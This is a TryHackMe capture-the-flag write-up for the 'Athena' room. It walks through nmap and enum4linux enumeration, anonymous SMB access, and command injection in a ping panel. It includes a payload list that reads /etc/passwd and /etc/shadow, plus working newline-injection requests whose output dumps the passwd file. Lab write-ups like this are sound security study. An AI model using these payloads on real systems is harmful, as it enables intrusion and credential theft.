<h1 align="center">Athena</h1>
<p align="center">2025, August 5<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>455</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
<em>Break all security and compromise the machine.</em>.<br>
<img width="80px" src="https://github.com/user-attachments/assets/ed6cda93-a786-4651-abbd-6147aa2a1d02"><br>
Access the CTF<a href="https://tryhackme.com/room/4th3n4">here </a>.<br>
<img width="1200px" src=""></p>


<br>
<br>

<h2>Task 1 . Athena</h2>



<br>

<h3>nmap</h3>

```bash
:~/Athena# nmap -sT -T4 TargetIP
...
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```

```bash
:~/Athena# nmap -sC -sV -p- -T4 TargetIP
...
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Athena - Gods of olympus
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
...
Host script results:
|_clock-skew: -1s
|_nbstat: NetBIOS name: ROUTERPANEL, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-08-05T18:15:28
|_  start_date: N/A
```

<br>

<h3>Web 80</h3>

<img width="1326" height="692" alt="image" src="https://github.com/user-attachments/assets/876395a6-6380-49ba-bf50-69cb93da3046" />

```bash
<!DOCTYPE html>
<html>
  <head>
    <title>Athena - Gods of olympus</title>
    <meta name="description" content="Page about Athena, the Greek goddess of wisdom, war strategy and the arts.">
    <meta name="author" content="matheuz">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
  </head>
  <body>
    <header>
      <nav>
        <ul>
          <li><a href="#">Home</a></li>
          <li><a href="#">About</a></li>
          <li><a href="#">Contact</a></li>
        </ul>
      </nav>
      <h1>Athena - Gods of Olympus</h1>
      <p class="subtitle">The Greek goddess of wisdom, war strategy and the arts</p>
    </header>
    <main>
      <section>
        <h2>Who is Athena?</h2>
        <p>Athena is the daughter of Zeus and the goddess Metis, who was swallowed by Zeus when she was pregnant. Athena was born from the head of Zeus, fully armed and adult. She is the goddess of wisdom, war strategy and the arts. She is often portrayed with an owl, which symbolizes wisdom, on her shoulder.</p>
      </section>
      <section>
        <h2>Athena and Greek Mythology</h2>
        <p>In addition to being the goddess of wisdom, Athena is known for helping Greek heroes in their battles against monsters and other mythological creatures. She was also one of the most important designees for the city of Athens, which was named after the goddess.</p>
        <img src="athena.jpg" alt="Athena">
      </section>
    </main>
  </body>
</html>
```


<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/6123d0ea-50a9-41b3-b7cb-30c8b26a4798"></p>

<br>

<h3>enum4linux</h3>

<p>

  
- //10.201.26.189/public	Mapping: OK, Listing: OK</p>


```bash
:~/Athena# enum4linux 10.201.26.189
WARNING: polenum.py is not in your path.  Check that package is installed and your PATH is sane.
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Aug  5 19:28:50 2025

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.201.26.189
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===================================================== 
|    Enumerating Workgroup/Domain on 10.201.26.189    |
 ===================================================== 
[+] Got domain/workgroup name: SAMBA

 ============================================= 
|    Nbtstat Information for 10.201.26.189    |
 ============================================= 
Looking up status of 10.201.26.189
	ROUTERPANEL     <00> -         B <ACTIVE>  Workstation Service
	ROUTERPANEL     <03> -         B <ACTIVE>  Messenger Service
	ROUTERPANEL     <20> -         B <ACTIVE>  File Server Service
	..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
	SAMBA           <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
	SAMBA           <1d> -         B <ACTIVE>  Master Browser
	SAMBA           <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

	MAC Address = 00-00-00-00-00-00

 ====================================== 
|    Session Check on 10.201.26.189    |
 ====================================== 
[+] Server 10.201.26.189 allows sessions using username '', password ''

 ============================================ 
|    Getting domain SID for 10.201.26.189    |
 ============================================ 
Domain Name: SAMBA
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 ======================================= 
|    OS information on 10.201.26.189    |
 ======================================= 
Use of uninitialized value $os_info in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 464.
[+] Got OS info for 10.201.26.189 from smbclient: 
[+] Got OS info for 10.201.26.189 from srvinfo:
	ROUTERPANEL    Wk Sv PrQ Unx NT SNT Samba 4.15.13-Ubuntu
	platform_id     :	500
	os version      :	6.1
	server type     :	0x809a03

 ============================== 
|    Users on 10.201.26.189    |
 ============================== 
Use of uninitialized value $users in print at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 876.
Use of uninitialized value $users in pattern match (m//) at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 879.

Use of uninitialized value $users in print at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 892.
Use of uninitialized value $users in pattern match (m//) at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 894.

 ========================================== 
|    Share Enumeration on 10.201.26.189    |
 ========================================== 

	Sharename       Type      Comment
	---------       ----      -------
	public          Disk      
	IPC$            IPC       IPC Service (Samba 4.15.13-Ubuntu)
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on 10.201.26.189
//10.201.26.189/public	Mapping: OK, Listing: OK
//10.201.26.189/IPC$	[E] Can't understand response:
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*

 ===================================================== 
|    Password Policy Information for 10.201.26.189    |
 ===================================================== 
[E] Dependent program "polenum.py" not present.  Skipping this check.  Download polenum from http://labs.portcullis.co.uk/application/polenum/


 =============================== 
|    Groups on 10.201.26.189    |
 =============================== 

[+] Getting builtin groups:

[+] Getting builtin group memberships:

[+] Getting local groups:

[+] Getting local group memberships:

[+] Getting domain groups:

[+] Getting domain group memberships:

 ======================================================================== 
|    Users on 10.201.26.189 via RID cycling (RIDS: 500-550,1000-1050)    |
 ======================================================================== 
[I] Found new SID: S-1-22-1
[I] Found new SID: S-1-5-21-1444009243-207373887-3299893081
[I] Found new SID: S-1-5-32
[+] Enumerating users using SID S-1-5-32 and logon username '', password ''
S-1-5-32-500 *unknown*\*unknown* (8)
S-1-5-32-501 *unknown*\*unknown* (8)
S-1-5-32-502 *unknown*\*unknown* (8)
S-1-5-32-503 *unknown*\*unknown* (8)
S-1-5-32-504 *unknown*\*unknown* (8)
S-1-5-32-505 *unknown*\*unknown* (8)
S-1-5-32-506 *unknown*\*unknown* (8)
S-1-5-32-507 *unknown*\*unknown* (8)
S-1-5-32-508 *unknown*\*unknown* (8)
S-1-5-32-509 *unknown*\*unknown* (8)
S-1-5-32-510 *unknown*\*unknown* (8)
S-1-5-32-511 *unknown*\*unknown* (8)
S-1-5-32-512 *unknown*\*unknown* (8)
S-1-5-32-513 *unknown*\*unknown* (8)
S-1-5-32-514 *unknown*\*unknown* (8)
S-1-5-32-515 *unknown*\*unknown* (8)
S-1-5-32-516 *unknown*\*unknown* (8)
S-1-5-32-517 *unknown*\*unknown* (8)
S-1-5-32-518 *unknown*\*unknown* (8)
S-1-5-32-519 *unknown*\*unknown* (8)
S-1-5-32-520 *unknown*\*unknown* (8)
S-1-5-32-521 *unknown*\*unknown* (8)
S-1-5-32-522 *unknown*\*unknown* (8)
S-1-5-32-523 *unknown*\*unknown* (8)
S-1-5-32-524 *unknown*\*unknown* (8)
S-1-5-32-525 *unknown*\*unknown* (8)
S-1-5-32-526 *unknown*\*unknown* (8)
S-1-5-32-527 *unknown*\*unknown* (8)
S-1-5-32-528 *unknown*\*unknown* (8)
S-1-5-32-529 *unknown*\*unknown* (8)
S-1-5-32-530 *unknown*\*unknown* (8)
S-1-5-32-531 *unknown*\*unknown* (8)
S-1-5-32-532 *unknown*\*unknown* (8)
S-1-5-32-533 *unknown*\*unknown* (8)
S-1-5-32-534 *unknown*\*unknown* (8)
S-1-5-32-535 *unknown*\*unknown* (8)
S-1-5-32-536 *unknown*\*unknown* (8)
S-1-5-32-537 *unknown*\*unknown* (8)
S-1-5-32-538 *unknown*\*unknown* (8)
S-1-5-32-539 *unknown*\*unknown* (8)
S-1-5-32-540 *unknown*\*unknown* (8)
S-1-5-32-541 *unknown*\*unknown* (8)
S-1-5-32-542 *unknown*\*unknown* (8)
S-1-5-32-543 *unknown*\*unknown* (8)
S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)
S-1-5-32-1000 *unknown*\*unknown* (8)
S-1-5-32-1001 *unknown*\*unknown* (8)
S-1-5-32-1002 *unknown*\*unknown* (8)
S-1-5-32-1003 *unknown*\*unknown* (8)
S-1-5-32-1004 *unknown*\*unknown* (8)
S-1-5-32-1005 *unknown*\*unknown* (8)
S-1-5-32-1006 *unknown*\*unknown* (8)
S-1-5-32-1007 *unknown*\*unknown* (8)
S-1-5-32-1008 *unknown*\*unknown* (8)
S-1-5-32-1009 *unknown*\*unknown* (8)
S-1-5-32-1010 *unknown*\*unknown* (8)
S-1-5-32-1011 *unknown*\*unknown* (8)
S-1-5-32-1012 *unknown*\*unknown* (8)
S-1-5-32-1013 *unknown*\*unknown* (8)
S-1-5-32-1014 *unknown*\*unknown* (8)
S-1-5-32-1015 *unknown*\*unknown* (8)
S-1-5-32-1016 *unknown*\*unknown* (8)
S-1-5-32-1017 *unknown*\*unknown* (8)
S-1-5-32-1018 *unknown*\*unknown* (8)
S-1-5-32-1019 *unknown*\*unknown* (8)
S-1-5-32-1020 *unknown*\*unknown* (8)
S-1-5-32-1021 *unknown*\*unknown* (8)
S-1-5-32-1022 *unknown*\*unknown* (8)
S-1-5-32-1023 *unknown*\*unknown* (8)
S-1-5-32-1024 *unknown*\*unknown* (8)
S-1-5-32-1025 *unknown*\*unknown* (8)
S-1-5-32-1026 *unknown*\*unknown* (8)
S-1-5-32-1027 *unknown*\*unknown* (8)
S-1-5-32-1028 *unknown*\*unknown* (8)
S-1-5-32-1029 *unknown*\*unknown* (8)
S-1-5-32-1030 *unknown*\*unknown* (8)
S-1-5-32-1031 *unknown*\*unknown* (8)
S-1-5-32-1032 *unknown*\*unknown* (8)
S-1-5-32-1033 *unknown*\*unknown* (8)
S-1-5-32-1034 *unknown*\*unknown* (8)
S-1-5-32-1035 *unknown*\*unknown* (8)
S-1-5-32-1036 *unknown*\*unknown* (8)
S-1-5-32-1037 *unknown*\*unknown* (8)
S-1-5-32-1038 *unknown*\*unknown* (8)
S-1-5-32-1039 *unknown*\*unknown* (8)
S-1-5-32-1040 *unknown*\*unknown* (8)
S-1-5-32-1041 *unknown*\*unknown* (8)
S-1-5-32-1042 *unknown*\*unknown* (8)
S-1-5-32-1043 *unknown*\*unknown* (8)
S-1-5-32-1044 *unknown*\*unknown* (8)
S-1-5-32-1045 *unknown*\*unknown* (8)
S-1-5-32-1046 *unknown*\*unknown* (8)
S-1-5-32-1047 *unknown*\*unknown* (8)
S-1-5-32-1048 *unknown*\*unknown* (8)
S-1-5-32-1049 *unknown*\*unknown* (8)
S-1-5-32-1050 *unknown*\*unknown* (8)
[+] Enumerating users using SID S-1-5-21-1444009243-207373887-3299893081 and logon username '', password ''
S-1-5-21-1444009243-207373887-3299893081-500 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-501 ROUTERPANEL\nobody (Local User)
S-1-5-21-1444009243-207373887-3299893081-502 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-503 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-504 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-505 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-506 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-507 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-508 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-509 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-510 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-511 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-512 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-513 ROUTERPANEL\None (Domain Group)
S-1-5-21-1444009243-207373887-3299893081-514 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-515 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-516 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-517 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-518 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-519 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-520 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-521 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-522 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-523 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-524 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-525 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-526 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-527 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-528 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-529 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-530 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-531 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-532 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-533 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-534 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-535 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-536 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-537 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-538 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-539 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-540 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-541 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-542 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-543 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-544 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-545 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-546 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-547 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-548 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-549 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-550 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-1000 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-1001 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-1002 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-1003 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-1004 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-1005 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-1006 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-1007 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-1008 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-1009 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-1010 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-1011 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-1012 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-1013 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-1014 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-1015 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-1016 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-1017 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-1018 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-1019 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-1020 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-1021 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-1022 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-1023 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-1024 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-1025 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-1026 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-1027 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-1028 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-1029 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-1030 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-1031 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-1032 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-1033 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-1034 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-1035 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-1036 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-1037 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-1038 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-1039 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-1040 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-1041 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-1042 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-1043 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-1044 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-1045 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-1046 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-1047 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-1048 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-1049 *unknown*\*unknown* (8)
S-1-5-21-1444009243-207373887-3299893081-1050 *unknown*\*unknown* (8)
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\ubuntu (Local User)
S-1-22-1-1001 Unix User\athena (Local User)

 ============================================== 
|    Getting printer info for 10.201.26.189    |
 ============================================== 
No printers returned.


enum4linux complete on Tue Aug  5 19:29:06 2025
```

<br>

<h3>smbclient</h3>


```bash
:~/Athena# smbclient //10.201.26.189/public
Password for [WORKGROUP\root]:
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Apr 17 01:54:43 2023
  ..                                  D        0  Mon Apr 17 01:54:05 2023
  msg_for_administrator.txt           N      253  Sun Apr 16 19:59:44 2023

		19947120 blocks of size 1024. 9693376 blocks available
smb: \> get msg_for_administrator.txt
getting file \msg_for_administrator.txt of size 253 as msg_for_administrator.txt (2.5 KiloBytes/sec) (average 2.5 KiloBytes/sec)
smb: \> exit
```

<h3>msg_for_Administrator.txt</h3>
<p>

- /myrouterpanel</p>

```bash
:~/Athena# cat msg_for_administrator.txt

Dear Administrator,

I would like to inform you that a new Ping system is being developed and I left the corresponding application in a specific path, which can be accessed through the following address: /myrouterpanel

Yours sincerely,

Athena
Intern
```
<br>

<h3>/myrouterpanel</h3>

<img width="1324" height="399" alt="image" src="https://github.com/user-attachments/assets/f94c25c0-d552-412c-b6b4-66792f7210d6" />


<img width="1320" height="256" alt="image" src="https://github.com/user-attachments/assets/538bf4d0-a48d-479a-9920-03c0d2ecb8aa" />

<p>AttackIP</p>

```bash
:~/Athena# sudo tcpdump -i ens5 icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on ens5, link-type EN10MB (Ethernet), capture size 262144 bytes
19:39:34.017739 IP ip-10-201-26-189.ec2.internal > ip-10-201-106-232.ec2.internal: ICMP echo request, id 1, seq 1, length 64
19:39:34.017802 IP ip-10-201-106-232.ec2.internal > ip-10-201-26-189.ec2.internal: ICMP echo reply, id 1, seq 1, length 64
19:39:35.035215 IP ip-10-201-26-189.ec2.internal > ip-10-201-106-232.ec2.internal: ICMP echo request, id 1, seq 2, length 64
19:39:35.035248 IP ip-10-201-106-232.ec2.internal > ip-10-201-26-189.ec2.internal: ICMP echo reply, id 1, seq 2, length 64
19:39:36.059202 IP ip-10-201-26-189.ec2.internal > ip-10-201-106-232.ec2.internal: ICMP echo request, id 1, seq 3, length 64
19:39:36.059230 IP ip-10-201-106-232.ec2.internal > ip-10-201-26-189.ec2.internal: ICMP echo reply, id 1, seq 3, length 64
19:39:37.083230 IP ip-10-201-26-189.ec2.internal > ip-10-201-106-232.ec2.internal: ICMP echo request, id 1, seq 4, length 64
19:39:37.083260 IP ip-10-201-106-232.ec2.internal > ip-10-201-26-189.ec2.internal: ICMP echo reply, id 1, seq 4, length 64
19:39:51.163929 IP ip-10-201-106-232.ec2.internal > scanner-011.ch1.censys-scanner.com: ICMP ip-10-201-106-232.ec2.internal udp port 1261 unreachable, length 64
19:41:13.710504 IP ip-10-201-106-232.ec2.internal > 186.149.216.162.bc.googleusercontent.com: ICMP ip-10-201-106-232.ec2.internal udp port 1137 unreachable, length 86
^C
10 packets captured
10 packets received by filter
0 packets dropped by kernel
```

<p>127.0.0.1</p>

<img width="1060" height="203" alt="image" src="https://github.com/user-attachments/assets/e4406042-acdc-4206-896f-f9567081fcba" />


<h3>Burp Suite and FoxyProxy</h3>

<img width="721" height="323" alt="image" src="https://github.com/user-attachments/assets/50cbdb56-e078-46fc-b8ef-39f76d9e1874" />


<h3>Command Injection Wordlist</h3>
<p>https://github.com/payloadbox/command-injection-payload-list</p>

<img width="977" height="318" alt="image" src="https://github.com/user-attachments/assets/31c926ff-2900-4046-bb70-940655b25fa0" />


```bash
:~/Athena# head wordlist.txt
&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;
&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;
&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
/index.html|id|
;id;
;id
;netstat -a;
;system('cat%20/etc/passwd')
;id;
```


<h3>Burp Suite Intruder</h3>

<img width="721" height="363" alt="image" src="https://github.com/user-attachments/assets/3988fb2d-249b-49f6-a67a-d3faa824cce7" />


<img width="1177" height="466" alt="image" src="https://github.com/user-attachments/assets/9b23234e-4724-4d0f-b4d2-0e86f225594b" />

<p>ip=127.0.0.1%0Acat%20%2fetc%2fpasswd&submit=</p>

```bash
HTTP/1.1 200 OK
Date: Tue, 05 Aug 2025 18:55:41 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 3409
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<pre>PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.022 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.031 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.033 ms
64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.034 ms

--- 127.0.0.1 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3071ms
rtt min/avg/max/mdev = 0.022/0.030/0.034/0.004 ms
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:115::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:109:116:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
usbmux:x:110:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:111:117:RealtimeKit,,,:/proc:/usr/sbin/nologin
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
cups-pk-helper:x:113:120:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
avahi:x:115:121:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
saned:x:117:123::/var/lib/saned:/usr/sbin/nologin
nm-openvpn:x:118:124:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin
hplip:x:119:7:HPLIP system user,,,:/run/hplip:/bin/false
whoopsie:x:120:125::/nonexistent:/bin/false
colord:x:121:126:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
fwupd-refresh:x:122:127:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
geoclue:x:123:128::/var/lib/geoclue:/usr/sbin/nologin
pulse:x:124:129:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
gnome-initial-setup:x:125:65534::/run/gnome-initial-setup/:/bin/false
gdm:x:126:131:Gnome Display Manager:/var/lib/gdm3:/bin/false
sssd:x:127:132:SSSD system user,,,:/var/lib/sss:/usr/sbin/nologin
ubuntu:x:1000:1000:ubuntu,,,:/home/ubuntu:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
athena:x:1001:1001::/home/athena:/bin/bash
sshd:x:128:65534::/run/sshd:/usr/sbin/nologin
```

<p>
  
- ip=127.0.0.1%0A%2fusr%2fbin%2fid&submit=<br>
- ip=127.0.0.1%0Aid&submit=<br>
- ip=127.0.0.1%0Aid%0A&submit=<br>
- ip=127.0.0.1%0A%2fusr%2fbin%2fid%0A&submit=<br>

<br>

```bash
HTTP/1.1 200 OK
Date: Tue, 05 Aug 2025 18:55:47 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 490
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<pre>PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.023 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.031 ms
